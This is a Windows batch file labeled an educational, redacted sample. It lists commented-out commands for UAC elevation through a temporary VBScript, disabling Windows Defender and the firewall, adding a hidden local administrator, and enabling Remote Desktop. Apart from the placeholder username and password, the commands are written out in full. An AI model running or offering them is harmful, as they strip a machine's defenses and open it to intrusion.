:: -----------------------------
:: Auto-elevation / minimized relaunch (REDACTED)
:: -----------------------------
:: Original idea: relaunch script with admin privileges and minimize the window.
:: Redacted example placeholder (non-executable):
:: :: if not defined IS_MINIMIZED ( set IS_MINIMIZED=1 & start "" /min "%~dpnx0" %* & exit )

:: -----------------------------
:: Disable Defender realtime (REDACTED)
:: -----------------------------
:: Dangerous command removed:
:: :: powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: -----------------------------
:: Request admin privileges helper (REDACTED)
:: -----------------------------
:: Original created a temporary VBScript to get admin privileges:
:: :: echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
:: :: echo UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
:: :: "%temp%\getadmin.vbs"
:: We removed it for safety.

:: -----------------------------
:: Add new admin user (REDACTED)
:: -----------------------------
:: DANGEROUS - DO NOT UNCOMMENT:
:: :: net user <REDACTED_USERNAME> <REDACTED_PASSWORD> /add
:: :: net localgroup administrators <REDACTED_USERNAME> /add

:: -----------------------------
:: Enable Remote Desktop (REDACTED)
:: -----------------------------
:: DANGEROUS - DO NOT UNCOMMENT:
:: :: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
:: :: netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: -----------------------------
:: Disable Windows Defender via registry (REDACTED)
:: -----------------------------
:: DANGEROUS - DO NOT UNCOMMENT:
:: :: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
:: :: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
:: :: sc stop WinDefend
:: :: sc config WinDefend start= disabled

:: -----------------------------
:: Fully disable Windows Firewall (REDACTED)
:: -----------------------------
:: DANGEROUS - DO NOT UNCOMMENT:
:: :: netsh advfirewall set allprofiles state off

:: -----------------------------
:: Clean up & safe message
:: -----------------------------
echo ===============================================
echo REDACTED SAMPLE (SAFE) - educational only
